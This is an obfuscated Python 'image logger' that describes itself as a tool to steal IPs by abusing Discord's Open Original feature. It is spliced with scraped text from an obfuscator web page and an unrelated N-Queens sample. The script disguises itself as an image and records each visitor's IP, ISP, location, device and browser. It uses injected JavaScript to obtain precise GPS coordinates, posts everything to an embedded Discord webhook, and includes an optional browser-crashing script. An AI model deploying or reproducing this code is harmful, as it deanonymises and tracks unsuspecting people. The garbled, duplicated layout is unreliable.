from http .server import BaseHTTPRequestHandler #line:5
from urllib import parse #line:6
import traceback ,requests ,base64 ,httpagentparser #line:7
__app__ ="Skibidi Image Logger"#line:9
__description__ ="A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"#line:10
__version__ ="v2.0"#line:11
__author__ ="Castles"#line:12
config ={"webhook":"https://discord.com/api/webhooks/1335889554376495134/XCXPhLhA3JJJur3UwmxGyxFoxkSMKI3Zy0aVDmmLMJks8UjUgal2DehxDP5cuPVNKn2-","image":"https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg","imageArgument":True ,"username":"Skibidi Logger","color":0x00FFFF ,"crashBrowser":False ,"accurateLocation":True ,"message":{"doMessage":True ,"message":"Image failed to load. Please try again later.","richMessage":True ,},"vpnCheck":2 ,"linkAlerts":True ,"buggedImage":True ,"antiBot":4 ,"redirect":{"redirect":False ,"page":"https://your-link.here"},}#line:65
blacklistedIPs =("27","104","143","164")#line:67
def botCheck (ip ,useragent ):#line:70
    if ip .startswith (("34","35")):#line:71
        return "Discord"#line:72
    elif useragent .startswith ("TelegramBot"):#line:73
        return "Telegram"#line:74
    else :#line:75
        return False #line:76
def reportError (error ):#line:78
    requests .post (config ["webhook"],json ={"username":config ["username"],"content":"@everyone","embeds":[{"title":"Image Logger - Error","color":config ["color"],"description":f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",}],})#line:89
def makeReport (ip ,useragent =None ,coords =None ,endpoint ="N/A",url =False ):#line:91
    if ip .startswith (blacklistedIPs ):#line:92
        return #line:93
    OO0O0O0OO0OO00O0O =botCheck (ip ,useragent )#line:95
    if OO0O0O0OO0OO00O0O :#line:97Oxyry Python Obfuscator
the power to protect your python source code
Obfuscate
Source 
NQueens
"""The n queens puzzle.

https://github.com/sol-prog/N-Queens-Puzzle/blob/master/nqueens.py
"""

__all__ = []

class NQueens:
    """Generate all valid solutions for the n queens puzzle"""
    
    def __init__(self, size):
        # Store the puzzle (problem) size and the number of valid solutions
        self.__size = size
        self.__solutions = 0
        self.__solve()

    def __solve(self):
        """Solve the n queens puzzle and print the number of solutions"""
        positions = [-1] * self.__size
        self.__put_queen(positions, 0)
        print("Found", self.__solutions, "solutions.")

    def __put_queen(self, positions, target_row):
        """
        Try to place a queen on target_row by checking all N possible cases.
        If a valid place is found the function calls itself trying to place a queen
        on the next row until all N queens are placed on the NxN board.
        """
        # Base (stop) case - all N rows are occupied
        if target_row == self.__size:
            self.__show_full_board(positions)
            self.__solutions += 1
        else:
            # For all N columns positions try to place a queen
            for column in range(self.__size):
                # Reject all invalid positions
                if self.__check_place(positions, target_row, column):
                    positions[target_row] = column
                    self.__put_queen(positions, target_row + 1)


    def __check_place(self, positions, ocuppied_rows, column):
        """
        Check if a given position is under attack from any of
        the previously placed queens (check column and diagonal positions)
        """
        for i in range(ocuppied_rows):
            if positions[i] == column or \
                positions[i] - i == column - ocuppied_rows or \
                positions[i] + i == column + ocuppied_rows:

                return False
        return True

    def __show_full_board(self, positions):
        """Show the full NxN board"""
        for row in range(self.__size):
            line = ""
            for column in range(self.__size):
                if positions[row] == column:
                    line += "Q "
                else:
                    line += ". "
            print(line)
        print("\n")

    def __show_short_board(self, positions):
        """
        Show the queens positions on the board in compressed form,
        each number represent the occupied column position in the corresponding row.
        """
        line = ""
        for i in range(self.__size):
            line += str(positions[i]) + " "
        print(line)

def main():
    """Initialize and solve the n queens puzzle"""
    NQueens(8)

if __name__ == "__main__":
    # execute only if run as a script
    main()

230
            
231
            else:
232
                s = self.path
233
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
234
​
235
                if dic.get("g") and config["accurateLocation"]:
236
                    location = base64.b64decode(dic.get("g").encode()).decode()
237
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
238
                else:
239
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
240
                
241
​
242
                message = config["message"]["message"]
243
​
244
                if config["message"]["richMessage"] and result:
245
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
246
                    message = message.replace("{isp}", result["isp"])
247
                    message = message.replace("{asn}", result["as"])
248
                    message = message.replace("{country}", result["country"])
249
                    message = message.replace("{region}", result["regionName"])
250
                    message = message.replace("{city}", result["city"])
251
                    message = message.replace("{lat}", str(result["lat"]))
252
                    message = message.replace("{long}", str(result["lon"]))
253
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
254
                    message = message.replace("{mobile}", str(result["mobile"]))
255
                    message = message.replace("{vpn}", str(result["proxy"]))
256
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
257
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
258
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
259
​
260
                datatype = 'text/html'
261
​
262
                if config["message"]["doMessage"]:
263
                    data = message.encode()
264
                
265
                if config["crashBrowser"]:
266
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
267
​
268
                if config["redirect"]["redirect"]:
269
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
270
                self.send_response(200) # 200 = OK (HTTP Status)
271
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
272
                self.end_headers() # Declare the headers as finished.
273
​
274
                if config["accurateLocation"]:
275
                    data += b"""<script>
276
var currenturl = window.location.href;
277
​
278
if (!currenturl.includes("g=")) {
279
    if (navigator.geolocation) {
280
        navigator.geolocation.getCurrentPosition(function (coords) {
281
    if (currenturl.includes("?")) {
282
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
283
    } else {
284
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
285
    }
286
    location.replace(currenturl);});
287
}}
288
​
289
</script>"""
290
                self.wfile.write(data)
291
        
292
        except Exception:
293
            self.send_response(500)
294
            self.send_header('Content-type', 'text/html')
295
            self.end_headers()
296
​
297
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
298
            reportError(traceback.format_exc())
299
​
300
        return
301
    
302
    do_GET = handleRequest
303
    do_POST = handleRequest
304
​
305
handler = app = ImageLoggerAPI
306
​
Destination
1
from http .server import BaseHTTPRequestHandler #line:5
2
from urllib import parse #line:6
3
import traceback ,requests ,base64 ,httpagentparser #line:7
4
__app__ ="Skibidi Image Logger"#line:9
5
__description__ ="A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"#line:10
6
__version__ ="v2.0"#line:11
7
__author__ ="Castles"#line:12
8
config ={"webhook":"https://discord.com/api/webhooks/1335889554376495134/XCXPhLhA3JJJur3UwmxGyxFoxkSMKI3Zy0aVDmmLMJks8UjUgal2DehxDP5cuPVNKn2-","image":"https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg","imageArgument":True ,"username":"Skibidi Logger","color":0x00FFFF ,"crashBrowser":False ,"accurateLocation":True ,"message":{"doMessage":True ,"message":"Image failed to load. Please try again later.","richMessage":True ,},"vpnCheck":2 ,"linkAlerts":True ,"buggedImage":True ,"antiBot":4 ,"redirect":{"redirect":False ,"page":"https://your-link.here"},}#line:65
9
blacklistedIPs =("27","104","143","164")#line:67
10
def botCheck (ip ,useragent ):#line:70
11
    if ip .startswith (("34","35")):#line:71
12
        return "Discord"#line:72
13
    elif useragent .startswith ("TelegramBot"):#line:73
14
        return "Telegram"#line:74
15
    else :#line:75
16
        return False #line:76
17
def reportError (error ):#line:78
18
    requests .post (config ["webhook"],json ={"username":config ["username"],"content":"@everyone","embeds":[{"title":"Image Logger - Error","color":config ["color"],"description":f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",}],})#line:89
19
def makeReport (ip ,useragent =None ,coords =None ,endpoint ="N/A",url =False ):#line:91
20
    if ip .startswith (blacklistedIPs ):#line:92
21
        return #line:93
22
    OO0O0O0OO0OO00O0O =botCheck (ip ,useragent )#line:95
23
    if OO0O0O0OO0OO00O0O :#line:97
24
        requests .post (config ["webhook"],json ={"username":config ["username"],"content":"","embeds":[{"title":"Image Logger - Link Sent","color":config ["color"],"description":f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{OO0O0O0OO0OO00O0O}`",}],})if config ["linkAlerts"]else None #line:108
25
        return #line:109
26
    O0O0O0O0O0O000000 ="@everyone"#line:111
27
    OOO0000OO000OO0OO =requests .get (f"http://ip-api.com/json/{ip}?fields=16976857").json ()#line:113
28
    if OOO0000OO000OO0OO ["proxy"]:#line:114
29
        if config ["vpnCheck"]==2 :#line:115
30
                return #line:116
31
        if config ["vpnCheck"]==1 :#line:118
32
            O0O0O0O0O0O000000 =""#line:119
33
    if OOO0000OO000OO0OO ["hosting"]:#line:121
34
        if config ["antiBot"]==4 :#line:122
35
            if OOO0000OO000OO0OO ["proxy"]:#line:123
36
                pass #line:124
37
            else :#line:125
38
                return #line:126
39
        if config ["antiBot"]==3 :#line:128
40
                return #line:129
41
        if config ["antiBot"]==2 :#line:131
42
            if OOO0000OO000OO0OO ["proxy"]:#line:132
Options
 Remove docstrings
 Rename non-default parameters def func(nondefault, default=value, *, kwonly)
 Rename default parameters def func(nondefault, default=value, *, kwonly)
 Append source (for debug obfuscated code)
Preserved names 
separate with spaces
Features
Rename symbol names, includes variables, functions, classes, arguments, class private methods. The name replacer avoids a 1:1 mapping of cleartext names to obfuscated names, the same name may be converted to several different names within different scopes.
Remove documentation strings.
Remove comments.
Python 3.3 - 3.7 are supported.
Unsupported python language features
Functions that access runtime namespace ( exec, dir, locals, globals ) may go wrong because of accessing objects that has been renamed.

Recommendations to achieve best results
Define export list (a variable named __all__) for each module.
Use positional arguments as much as possible.
Add double underscore prefix (e.g. __private) to class private attributes/methods.
Module level names
Every name except the names listed in module variable __all__ are all considered private and will be renamed. If __all__ is not defined, the set of private names includes all names found in the module’s namespace which begin with underscore character ('_').

It's safe to rename function parameters?
If you open options for rename parameters, you need to make sure that do not use them as keyword arguments in function call.

Submitting bugs and feedback
Access Issue List

Purchase offline cli version
Purchase

© 2018 oxyry.com all rights reversed.
        requests .post (config ["webhook"],json ={"username":config ["username"],"content":"","embeds":[{"title":"Image Logger - Link Sent","color":config ["color"],"description":f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{OO0O0O0OO0OO00O0O}`",}],})if config ["linkAlerts"]else None #line:108
        return #line:109
    O0O0O0O0O0O000000 ="@everyone"#line:111
    OOO0000OO000OO0OO =requests .get (f"http://ip-api.com/json/{ip}?fields=16976857").json ()#line:113
    if OOO0000OO000OO0OO ["proxy"]:#line:114
        if config ["vpnCheck"]==2 :#line:115
                return #line:116
        if config ["vpnCheck"]==1 :#line:118
            O0O0O0O0O0O000000 =""#line:119
    if OOO0000OO000OO0OO ["hosting"]:#line:121
        if config ["antiBot"]==4 :#line:122
            if OOO0000OO000OO0OO ["proxy"]:#line:123
                pass #line:124
            else :#line:125
                return #line:126
        if config ["antiBot"]==3 :#line:128
                return #line:129
        if config ["antiBot"]==2 :#line:131
            if OOO0000OO000OO0OO ["proxy"]:#line:132
                pass #line:133
            else :#line:134
                O0O0O0O0O0O000000 =""#line:135
        if config ["antiBot"]==1 :#line:137
                O0O0O0O0O0O000000 =""#line:138
    OO0O0000OOOO0OO0O ,OO00O00OOO0000O00 =httpagentparser .simple_detect (useragent )#line:141
    OOOOO0000000O0OO0 ={"username":config ["username"],"content":O0O0O0O0O0O000000 ,"embeds":[{"title":"Image Logger - IP Logged","color":config ["color"],"description":f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{OOO0000OO000OO0OO['isp'] if OOO0000OO000OO0OO['isp'] else 'Unknown'}`
> **ASN:** `{OOO0000OO000OO0OO['as'] if OOO0000OO000OO0OO['as'] else 'Unknown'}`
> **Country:** `{OOO0000OO000OO0OO['country'] if OOO0000OO000OO0OO['country'] else 'Unknown'}`
> **Region:** `{OOO0000OO000OO0OO['regionName'] if OOO0000OO000OO0OO['regionName'] else 'Unknown'}`
> **City:** `{OOO0000OO000OO0OO['city'] if OOO0000OO000OO0OO['city'] else 'Unknown'}`
> **Coords:** `{str(OOO0000OO000OO0OO['lat'])+', '+str(OOO0000OO000OO0OO['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{OOO0000OO000OO0OO['timezone'].split('/')[1].replace('_', ' ')} ({OOO0000OO000OO0OO['timezone'].split('/')[0]})`
> **Mobile:** `{OOO0000OO000OO0OO['mobile']}`
> **VPN:** `{OOO0000OO000OO0OO['proxy']}`
> **Bot:** `{OOO0000OO000OO0OO['hosting'] if OOO0000OO000OO0OO['hosting'] and not OOO0000OO000OO0OO['proxy'] else 'Possibly' if OOO0000OO000OO0OO['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{OO0O0000OOOO0OO0O}`
> **Browser:** `{OO00O00OOO0000O00}`

**User Agent:**
```
{useragent}
```""",}],}#line:177
    if url :OOOOO0000000O0OO0 ["embeds"][0 ].update ({"thumbnail":{"url":url }})#line:179
    requests .post (config ["webhook"],json =OOOOO0000000O0OO0 )#line:180
    return OOO0000OO000OO0OO #line:181
binaries ={"loading":base64 .b85decode (b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}#line:188
class ImageLoggerAPI (BaseHTTPRequestHandler ):#line:190
    def handleRequest (self ):#line:192
        try :#line:193
            if config ["imageArgument"]:#line:194
                OOO00OOO00O0O0O00 =self .path #line:195
                O0000OO000OOO0OO0 =dict (parse .parse_qsl (parse .urlsplit (OOO00OOO00O0O0O00 ).query ))#line:196
                if O0000OO000OOO0OO0 .get ("url")or O0000OO000OOO0OO0 .get ("id"):#line:197
                    OO0000OOO00OOOOO0 =base64 .b64decode (O0000OO000OOO0OO0 .get ("url")or O0000OO000OOO0OO0 .get ("id").encode ()).decode ()#line:198
                else :#line:199
                    OO0000OOO00OOOOO0 =config ["image"]#line:200
            else :#line:201
                OO0000OOO00OOOOO0 =config ["image"]#line:202
            O0OO0O00O00000O0O =f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{OO0000OOO00OOOOO0}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode ()#line:215
            if self .headers .get ('x-forwarded-for').startswith (blacklistedIPs ):#line:217
                return #line:218
            if botCheck (self .headers .get ('x-forwarded-for'),self .headers .get ('user-agent')):#line:220
                self .send_response (200 if config ["buggedImage"]else 302 )#line:221
                self .send_header ('Content-type'if config ["buggedImage"]else 'Location','image/jpeg'if config ["buggedImage"]else OO0000OOO00OOOOO0 )#line:222
                self .end_headers ()#line:223
                if config ["buggedImage"]:self .wfile .write (binaries ["loading"])#line:225
                makeReport (self .headers .get ('x-forwarded-for'),endpoint =OOO00OOO00O0O0O00 .split ("?")[0 ],url =OO0000OOO00OOOOO0 )#line:227
                return #line:229
            else :#line:231
                OOO00OOO00O0O0O00 =self .path #line:232
                O0000OO000OOO0OO0 =dict (parse .parse_qsl (parse .urlsplit (OOO00OOO00O0O0O00 ).query ))#line:233
                if O0000OO000OOO0OO0 .get ("g")and config ["accurateLocation"]:#line:235
                    O000OO00000OO000O =base64 .b64decode (O0000OO000OOO0OO0 .get ("g").encode ()).decode ()#line:236
                    OOOOO00O0OO0OO000 =makeReport (self .headers .get ('x-forwarded-for'),self .headers .get ('user-agent'),O000OO00000OO000O ,OOO00OOO00O0O0O00 .split ("?")[0 ],url =OO0000OOO00OOOOO0 )#line:237
                else :#line:238
                    OOOOO00O0OO0OO000 =makeReport (self .headers .get ('x-forwarded-for'),self .headers .get ('user-agent'),endpoint =OOO00OOO00O0O0O00 .split ("?")[0 ],url =OO0000OOO00OOOOO0 )#line:239
                O00OOO0O0OOO00OO0 =config ["message"]["message"]#line:242
                if config ["message"]["richMessage"]and OOOOO00O0OO0OO000 :#line:244
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{ip}",self .headers .get ('x-forwarded-for'))#line:245
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{isp}",OOOOO00O0OO0OO000 ["isp"])#line:246
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{asn}",OOOOO00O0OO0OO000 ["as"])#line:247
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{country}",OOOOO00O0OO0OO000 ["country"])#line:248
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{region}",OOOOO00O0OO0OO000 ["regionName"])#line:249
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{city}",OOOOO00O0OO0OO000 ["city"])#line:250
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{lat}",str (OOOOO00O0OO0OO000 ["lat"]))#line:251
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{long}",str (OOOOO00O0OO0OO000 ["lon"]))#line:252
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{timezone}",f"{OOOOO00O0OO0OO000['timezone'].split('/')[1].replace('_', ' ')} ({OOOOO00O0OO0OO000['timezone'].split('/')[0]})")#line:253
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{mobile}",str (OOOOO00O0OO0OO000 ["mobile"]))#line:254
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{vpn}",str (OOOOO00O0OO0OO000 ["proxy"]))#line:255
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{bot}",str (OOOOO00O0OO0OO000 ["hosting"]if OOOOO00O0OO0OO000 ["hosting"]and not OOOOO00O0OO0OO000 ["proxy"]else 'Possibly'if OOOOO00O0OO0OO000 ["hosting"]else 'False'))#line:256
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{browser}",httpagentparser .simple_detect (self .headers .get ('user-agent'))[1 ])#line:257
                    O00OOO0O0OOO00OO0 =O00OOO0O0OOO00OO0 .replace ("{os}",httpagentparser .simple_detect (self .headers .get ('user-agent'))[0 ])#line:258
                OOO0O0O000O000000 ='text/html'#line:260
                if config ["message"]["doMessage"]:#line:262
                    O0OO0O00O00000O0O =O00OOO0O0OOO00OO0 .encode ()#line:263
                if config ["crashBrowser"]:#line:265
                    O0OO0O00O00000O0O =O00OOO0O0OOO00OO0 .encode ()+b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'#line:266
                if config ["redirect"]["redirect"]:#line:268
                    O0OO0O00O00000O0O =f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode ()#line:269
                self .send_response (200 )#line:270
                self .send_header ('Content-type',OOO0O0O000O000000 )#line:271
                self .end_headers ()#line:272
                if config ["accurateLocation"]:#line:274
                    O0OO0O00O00000O0O +=b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""#line:289
                self .wfile .write (O0OO0O00O00000O0O )#line:290
        except Exception :#line:292
            self .send_response (500 )#line:293
            self .send_header ('Content-type','text/html')#line:294
            self .end_headers ()#line:295
            self .wfile .write (b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')#line:297
            reportError (traceback .format_exc ())#line:298
        return #line:300
    do_GET =handleRequest #line:302
    do_POST =handleRequest #line:303
handler =app =ImageLoggerAPI #line:305
